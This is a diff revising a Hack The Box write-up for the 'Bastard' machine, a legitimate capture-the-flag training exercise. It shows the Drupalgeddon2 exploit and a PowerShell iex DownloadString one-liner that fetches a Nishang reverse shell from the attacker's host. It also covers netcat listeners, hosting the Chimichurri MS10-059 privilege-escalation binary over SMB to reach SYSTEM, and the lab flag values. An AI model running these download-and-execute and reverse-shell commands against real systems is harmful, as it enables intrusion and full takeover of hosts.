@@ -50,17 +50,17 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 70.82 seconds
 ```
 
-It seems like there is a website port open so let’s check it out!
+Here is their website.
 
 ![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Bastard/website.png?raw=true)
 
-I tried to bruteforce the login function but failed. Similarly, the account registration function doesn’t work.
+Not much success from brute-forcing the login page. Similarly, the account registration function doesn’t work.
 
-Thereafter, I realised that there is an interesting `CHANGELOG.txt` being filtered out in the website’s `robots.txt` revealed in the nmap scan!
+However, there is an interesting `CHANGELOG.txt` being filtered out in the website’s `robots.txt` revealed in the `nmap` scan.
 
 ![changelog](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Bastard/changelog.png?raw=true)
 
-It seems like the website is running on `Drupal 7.54`.
+The website is running on `Drupal 7.54`.
 
 # Exploit
 
@@ -94,7 +94,7 @@ Example for target that does require authentication:
        ruby drupalgeddon2.rb https://example.com --authentication
 ```
 
-Great! Now the script works~
+Great! Now the script works.
 
 ```ruby
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bastard/Drupalgeddon2]
@@ -147,22 +147,12 @@ nt authority\iusr
 
 # Privilege Escalation
 
-Before we move forward, we should get a better shell.
-
-Let’s use [Nishang’s](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse TCP shell!
+Before we move forward, we can upgrade our shell using [Nishang’s](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse TCP shell.
 
 ```bash
-┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bastard]
-└─# python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.10.9 - - [21/Apr/2022 13:46:47] "GET /shell.ps1 HTTP/1.1" 200 -
-
-- Drupal terminal -
-
 drupalgeddon2>> powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.9/shell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 1234
 
-- Netcat listener -
-
+# Start a netcat listener before executing the PowerShell script.
 ┌──(root㉿shiro)-[/home/shiro]
 └─# nc -nlvp 1234
 listening on [any] 1234 ...
@@ -174,7 +164,7 @@ PS C:\inetpub\drupal-7.54> whoami
 nt authority\iusr
 ```
 
-Finally, we have a interactive shell to work with.
+Now we have an interactive shell to work with.
 
 ```bash
 PS C:\inetpub\drupal-7.54> systeminfo
@@ -220,7 +210,7 @@ Network Card(s):           1 NIC(s) Installed.
                                  [01]: 10.10.10.9
 ```
 
-Let’s use Windows-Exploit-Suggester with this information.
+Let’s use Windows Exploit Suggester with this information.
 
 ```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bastard]
@@ -229,66 +219,34 @@ Let’s use Windows-Exploit-Suggester with this information.
 └─# mousepad systeminfo.txt                                                                                                        
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bastard]
 └─# Windows-Exploit-Suggester/windows-exploit-suggester.py --update
-[*] initiating winsploit version 3.3...
-[+] writing to file 2022-04-21-mssb.xls
+...
 [*] done
                                      
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bastard]
 └─# Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2022-04-21-mssb.xls --systeminfo systeminfo.txt
-[*] initiating winsploit version 3.3...
-[*] database file detected as xls or xlsx based on extension
-[*] attempting to read from the systeminfo input file
-[+] systeminfo input file read successfully (ascii)
-[*] querying database file for potential vulnerabilities
-[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
-[*] there are now 197 remaining vulns
-[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
-[+] windows version identified as 'Windows 2008 R2 64-bit'
-[*] 
 ...
 [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
-[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
-[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
-[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
+...
 [*] done
 ```
 
-It seems like this machine is vulnerable to `MS10-059` privilege escalation.
+This machine is vulnerable to `MS10-059` privilege escalation. Download the exploit from this [GitHub](https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe) repository and host a `smbserver` to share the file.
 
-So let’s download the exploit from this [GitHub](https://github.com/egre55/windows-kernel-exploits/blob/master/MS10-059:%20Chimichurri/Compiled/Chimichurri.exe) repository and host a `smbserver` to share the file.
-
-```powershell
+```bash
 ┌──(root㉿shiro)-[/home/shiro/HackTheBox/Bastard]
 └─# python /opt/impacket-0.9.19/examples/smbserver.py share .
-Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation
-
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Config file parsed
-[*] Config file parsed
-[*] Config file parsed
+...
 [*] Incoming connection (10.10.10.9,49445)
 [*] AUTHENTICATE_MESSAGE (\,BASTARD)
 [*] User \BASTARD authenticated successfully
-[*] :::00::4141414141414141
-[-] Unknown level for query path info! 0x109
-
-PS C:\inetpub\drupal-7.54> net use * /delete /y
-You have these remote connections:
-
-                    \\10.10.14.9\share
-Continuing will cancel the connections.
-
-The command completed successfully.
+...
 
 PS C:\inetpub\drupal-7.54> net use \\10.10.14.9\share
-The command completed successfully.
-
 PS C:\inetpub\drupal-7.54> copy \\10.10.14.9\share\Chimichurri.exe
 PS C:\inetpub\drupal-7.54> .\Chimichurri.exe 10.10.14.9 9999
+```
 
-- netcat listener - 
+```bash
 ┌──(root㉿shiro)-[/home/shiro]
 └─# nc -nlvp 9999             
 listening on [any] 9999 ...
@@ -298,19 +256,9 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\inetpub\drupal-7.54>whoami
 nt authority\system
-
-C:\inetpub\drupal-7.54>cd C:\Users
-C:\Users>dir
-19/03/2017  08:35 ��    <DIR>          .
-19/03/2017  08:35 ��    <DIR>          ..
-19/03/2017  02:20 ��    <DIR>          Administrator
-19/03/2017  02:54 ��    <DIR>          Classic .NET AppPool
-19/03/2017  08:35 ��    <DIR>          dimitris
-14/07/2009  07:57 ��    <DIR>          Public
-
-C:\Users>type dimitris\Desktop\user.txt
+C:\inetpub\drupal-7.54>type dimitris\Desktop\user.txt
 6be104d8d9844053846a3bada22a202c
-C:\Users>type administrator\Desktop\root.txt
+C:\inetpub\drupal-7.54>type administrator\Desktop\root.txt
 b31f4550141382cae0433214a2e97152
 ```
 
